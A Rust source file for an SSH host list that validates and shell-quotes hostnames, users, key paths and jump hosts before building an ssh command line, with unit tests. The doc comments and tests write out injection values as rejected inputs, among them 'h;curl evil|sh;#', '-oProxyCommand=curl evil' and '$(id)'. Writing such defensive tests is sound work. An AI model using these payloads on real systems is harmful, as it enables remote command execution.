//! SSH host types for the SSH subsystem.

use serde::{Deserialize, Serialize};

/// Source of an SSH host entry
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SshHostSource {
    /// Parsed from ~/.ssh/config
    Config,
    /// Found in ~/.ssh/known_hosts
    KnownHosts,
    /// Extracted from shell history
    History,
    /// Discovered via mDNS/Bonjour
    Mdns,
}

impl std::fmt::Display for SshHostSource {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Config => write!(f, "SSH Config"),
            Self::KnownHosts => write!(f, "Known Hosts"),
            Self::History => write!(f, "History"),
            Self::Mdns => write!(f, "mDNS"),
        }
    }
}

/// A discovered SSH host with connection details
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshHost {
    /// The Host alias from SSH config, or hostname from other sources
    pub alias: String,
    /// Resolved hostname or IP address
    pub hostname: Option<String>,
    /// SSH username
    pub user: Option<String>,
    /// SSH port (None means default 22)
    pub port: Option<u16>,
    /// Path to identity file
    pub identity_file: Option<String>,
    /// ProxyJump host
    pub proxy_jump: Option<String>,
    /// Where this host was discovered from
    pub source: SshHostSource,
}

impl SshHost {
    /// Get the display name for this host (alias or hostname)
    pub fn display_name(&self) -> &str {
        &self.alias
    }

    /// Get the connection target (hostname or alias)
    pub fn connection_target(&self) -> &str {
        self.hostname.as_deref().unwrap_or(&self.alias)
    }

    /// Build the ssh command arguments for connecting to this host.
    ///
    /// Suitable for `Command::args` (argv, no shell involved) **after**
    /// [`SshHost::validate_for_connect`] has passed. To render these into a
    /// shell command line, use [`SshHost::ssh_command_line`], which validates
    /// and quotes — never `args.join(" ")` (SEC-003).
    pub fn ssh_args(&self) -> Vec<String> {
        let mut args = Vec::new();

        if let Some(port) = self.port
            && port != 22
        {
            args.push("-p".to_string());
            args.push(port.to_string());
        }

        if let Some(ref identity) = self.identity_file {
            args.push("-i".to_string());
            args.push(identity.clone());
        }

        if let Some(ref proxy) = self.proxy_jump {
            args.push("-J".to_string());
            args.push(proxy.clone());
        }

        let target = if let Some(ref user) = self.user {
            format!("{}@{}", user, self.connection_target())
        } else {
            self.connection_target().to_string()
        };
        args.push(target);

        args
    }

    /// Build a display string showing user@host:port
    pub fn connection_string(&self) -> String {
        let mut s = String::new();
        if let Some(ref user) = self.user {
            s.push_str(user);
            s.push('@');
        }
        s.push_str(self.connection_target());
        if let Some(port) = self.port
            && port != 22
        {
            s.push(':');
            s.push_str(&port.to_string());
        }
        s
    }

    /// Reject host components that are unsafe to put on an SSH command line.
    ///
    /// Discovery sources are **not** trusted: an mDNS responder on the LAN
    /// chooses both the advertised hostname and the service instance name, so
    /// a service called `h;curl evil|sh;#` reaches [`SshHost::alias`] and
    /// [`SshHost::hostname`] verbatim. `~/.ssh/config` supplies
    /// [`SshHost::identity_file`] and [`SshHost::proxy_jump`].
    ///
    /// Covers both injection classes:
    /// - shell metacharacters, for the Quick Connect path that writes a
    ///   command line into the user's shell;
    /// - a leading `-`, which `ssh` parses as a flag (`-oProxyCommand=...`)
    ///   even when the arguments are passed as argv.
    ///
    /// # Errors
    ///
    /// Returns [`UnsafeSshComponent`] naming the first of the connection
    /// target, user, identity file, or proxy jump host that contains a shell
    /// metacharacter or begins with `-`. Fields that are `None` are skipped.
    pub fn validate_for_connect(&self) -> Result<(), UnsafeSshComponent> {
        let fields: [(&'static str, Option<&str>); 4] = [
            ("hostname", Some(self.connection_target())),
            ("user", self.user.as_deref()),
            ("identity file", self.identity_file.as_deref()),
            ("proxy jump host", self.proxy_jump.as_deref()),
        ];
        for (field, value) in fields {
            if let Some(value) = value
                && !is_safe_ssh_component(value)
            {
                return Err(UnsafeSshComponent {
                    field,
                    value: value.to_string(),
                });
            }
        }
        Ok(())
    }

    /// Build a shell-safe `ssh ...` command line for this host.
    ///
    /// The Quick Connect flow writes the result into the active pane's shell
    /// rather than spawning `ssh` via argv, so every argument is validated and
    /// then quoted. Returns the command **without** a trailing newline; the
    /// caller appends one to submit it.
    ///
    /// # Errors
    ///
    /// Propagates [`Self::validate_for_connect`]: returns
    /// [`UnsafeSshComponent`] when any host field is unsafe to place on a
    /// command line. Quoting is only applied to already-validated values.
    pub fn ssh_command_line(&self) -> Result<String, UnsafeSshComponent> {
        self.validate_for_connect()?;

        let mut line = String::from("ssh");
        for arg in self.ssh_args() {
            line.push(' ');
            line.push_str(&shell_quote(&arg));
        }
        Ok(line)
    }
}

/// A host component that cannot be safely placed on an SSH command line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UnsafeSshComponent {
    /// Human-readable name of the offending field.
    pub field: &'static str,
    /// The rejected value.
    pub value: String,
}

impl std::fmt::Display for UnsafeSshComponent {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "SSH {} {:?} contains characters that are unsafe on a command line",
            self.field, self.value
        )
    }
}

impl std::error::Error for UnsafeSshComponent {}

/// Shell metacharacters that never appear in a legitimate hostname, username,
/// or SSH key path, and that would be interpreted by the user's shell.
const SHELL_METACHARACTERS: [char; 9] = [';', '|', '&', '$', '`', '(', ')', '<', '>'];

/// True if `value` is safe to place on an SSH command line (SEC-003).
fn is_safe_ssh_component(value: &str) -> bool {
    !value.is_empty()
        && !value.starts_with('-')
        && !value
            .chars()
            .any(|c| c.is_control() || SHELL_METACHARACTERS.contains(&c))
}

/// Characters that need no quoting in a POSIX shell word.
///
/// `~` is deliberately included so `IdentityFile ~/.ssh/id_rsa` from
/// `~/.ssh/config` still tilde-expands; it is not otherwise shell-special.
fn is_plain_shell_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@' | '~' | '+' | ',')
}

/// Single-quote `arg` unless every character is unambiguous to the shell.
fn shell_quote(arg: &str) -> String {
    if !arg.is_empty() && arg.chars().all(is_plain_shell_char) {
        return arg.to_string();
    }
    format!("'{}'", arg.replace('\'', r"'\''"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn mdns_host(hostname: &str) -> SshHost {
        SshHost {
            alias: "svc".to_string(),
            hostname: Some(hostname.to_string()),
            user: None,
            port: None,
            identity_file: None,
            proxy_jump: None,
            source: SshHostSource::Mdns,
        }
    }

    #[test]
    fn rejects_shell_metacharacters_in_hostname() {
        // SEC-003: each of these reaches the hostname verbatim from an mDNS
        // responder on the LAN.
        for hostname in [
            "h;curl evil|sh;#",
            "host;id",
            "host|id",
            "host&id",
            "host$(id)",
            "host`id`",
            "host$IFS",
            "host<in",
            "host>out",
            "host(x)",
        ] {
            let host = mdns_host(hostname);
            assert!(
                host.ssh_command_line().is_err(),
                "expected {hostname:?} to be rejected"
            );
        }
    }

    #[test]
    fn rejects_newline_in_hostname() {
        // The trailing newline is what submits the injected command.
        assert!(mdns_host("host\nid").ssh_command_line().is_err());
        assert!(mdns_host("host\rid").ssh_command_line().is_err());
        assert!(mdns_host("host\0id").ssh_command_line().is_err());
    }

    #[test]
    fn rejects_leading_dash_hostname() {
        // `-oProxyCommand=...` is parsed as a flag, not a host.
        assert!(
            mdns_host("-oProxyCommand=curl evil")
                .ssh_command_line()
                .is_err()
        );
    }

    #[test]
    fn rejects_unsafe_user_identity_and_proxy() {
        let mut host = mdns_host("good.local");
        host.user = Some("root;id".to_string());
        assert!(host.ssh_command_line().is_err());

        let mut host = mdns_host("good.local");
        host.identity_file = Some("/k`id`".to_string());
        assert!(host.ssh_command_line().is_err());

        let mut host = mdns_host("good.local");
        host.proxy_jump = Some("bastion|id".to_string());
        assert!(host.ssh_command_line().is_err());
    }

    #[test]
    fn accepts_and_renders_a_normal_host() {
        let mut host = mdns_host("prod.example.com");
        host.user = Some("deploy".to_string());
        host.port = Some(2222);
        host.identity_file = Some("~/.ssh/id_prod".to_string());
        host.proxy_jump = Some("bastion".to_string());

        assert_eq!(
            host.ssh_command_line().unwrap(),
            "ssh -p 2222 -i ~/.ssh/id_prod -J bastion deploy@prod.example.com"
        );
    }

    #[test]
    fn quotes_identity_paths_containing_spaces() {
        let mut host = mdns_host("example.com");
        host.identity_file = Some("/home/me/my keys/id_rsa".to_string());
        assert_eq!(
            host.ssh_command_line().unwrap(),
            "ssh -i '/home/me/my keys/id_rsa' example.com"
        );
    }

    #[test]
    fn falls_back_to_alias_when_hostname_is_absent() {
        let mut host = mdns_host("ignored");
        host.hostname = None;
        host.alias = "svc;id".to_string();
        assert!(host.ssh_command_line().is_err());
    }
}
